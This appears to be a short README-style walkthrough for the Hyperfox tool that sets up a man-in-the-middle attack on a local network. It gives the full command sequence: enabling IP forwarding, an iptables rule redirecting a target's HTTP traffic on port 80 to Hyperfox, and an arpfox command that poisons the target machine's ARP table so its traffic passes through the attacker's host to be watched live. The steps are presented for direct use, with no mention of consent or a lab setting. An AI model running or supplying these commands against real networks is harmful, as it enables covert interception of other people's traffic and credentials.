Install
	go install github.com/malfunkt/hyperfox
Package binary
	wget https://github.com/malfunkt/hyperfox/releases/download/v1.9.8/hyperfox_linux_amd64.gz
	tar xf hyperfox_linux_amd64.gz
Locate the gateway IP and network interface
	route
The interface in our example is called wlan0 and the interface's gateway is 10.0.0.1.
	export HYPERFOX_GW=10.0.0.1
	export HYPERFOX_IFACE=wlan0
Then identify the IP address of the target, let's suppose it is 10.0.0.143.
	export HYPERFOX_TARGET=10.0.0.143
Enable IP forwarding on the host for it to act (temporarily) as a common router.
	sysctl -w net.ipv4.ip_forward=1
Issue an iptables rule on the host to instruct it to redirect all traffic that goes to port 80 (commonly HTTP) to a local port where Hyperfox is listening to (1080).
	iptables -A PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 80 -j REDIRECT --to-port 1080
We're almost ready, prepare Hyperfox to receive plain HTTP traffic:
	hyperfox
Test
https://github.com/malfunkt/hyperfox/pull/17
	curl -x http://127.0.0.1:1080 -v -L google.com

Finally, run arpfox to alter the target's ARP table so it starts sending its network traffic to the host box:
	arpfox -i $HYPERFOX_IFACE -t $HYPERFOX_TARGET $HYPERFOX_GW
and watch the live traffic coming in.
